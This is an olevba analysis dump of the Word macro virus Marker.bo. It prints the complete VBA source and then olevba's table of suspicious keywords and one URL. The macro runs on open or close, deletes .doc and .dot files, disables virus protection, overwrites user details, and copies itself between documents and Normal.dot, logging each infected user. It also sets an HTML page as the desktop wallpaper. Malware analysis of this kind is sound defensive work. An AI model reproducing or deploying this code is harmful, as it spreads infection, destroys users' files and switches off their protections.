olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.bo-701abf9192c11c8a11ed16e359fa3b32fe69ca7d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.bo-701abf9192c11c8a11ed16e359fa3b32fe69ca7d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'jonthebest@hotbot.com  Give me your comment about this Virus./.
Const JonDong = "Jon Paling Hebat Dong"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim Jon, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
Options.VirusProtection = False
Application.UserName = "JonMMx 2000"
Application.UserInitials = "MeMeX"
Application.UserAddress = "JonMMx2000@yahoo.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
DI = ad.CodeModule.Find(JonDong, 1, 1, 10000, 10000)
NTI = nt.CodeModule.Find(JonDong, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   Jon = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   Jon = Jon & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
   nt.CodeModule.AddFromString Jon
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    Jon = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString Jon
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\Jon.html" For Output As #1
 Print #1, "<Html><head><title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#C0C0C0' >"
 Print #1, "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
 Print #1, "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:jonthebest@hotbot.com'>Siti Nurhaliza</a></strong></font> </p>"
 Print #1, "<font normal><b>To the very best that happen in my life</b><p>"
 Print #1, "<br><img src='http://www.geocities.com/paris/maison/6766/jon_1st.jpg' width='78' height='55'>"
 Print #1, "<p>Long ago and in my mind, I can see your face lonely and lost in time "
 Print #1, "<br>You were gone since yester month But the memories, never would disappear"
 Print #1, "<br>I think of you, I THINK OF YOU."
 Print #1, "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
 Print #1, "<br>Yes it's hard to understand. Why you leaving me and all we dreaming on "
 Print #1, "<p>Dear Siti, <br>I close my eyes and see your face.  That's all I have to do to be with you. "
 Print #1, "<p>Dear Siti, <br>although I can not touch your face.  I know what I can do to be with you "
 Print #1, "<br>Long ago so faraway. But the light of blue, still living with me today."
 Print #1, "<br>You were gone since yester month.  But the memories never would disappear."
 Print #1, "<b><br>I wait for U, always</b>"
 Print #1, "<font color='#245505' size='6'><strong><p>Jon The Best</strong></font></center></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\Jon.html"
Return
Finish:
End Sub
'Logfile -->

' 06:14:2518:14:25 -Kamis, 22 Jul 1999
' JonMMx 2000
' jonthebest@hotbot.com
' 03:50:1415:50:14 -Dienstag, 8 Feb 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:44:1214:44:12 -Samstag, 25 Mrz 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:07:814:07:08 -Donnerstag, 30 Mrz 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:22:1714:22:17 -torsdag, 24 aug 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:09:224:09:22 PM PM-Wednesday, 6 Sep 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.geocities|URL                                          |
|          |.com/paris/maison/67|                                             |
|          |66/jon_1st.jpg'     |                                             |
+----------+--------------------+---------------------------------------------+

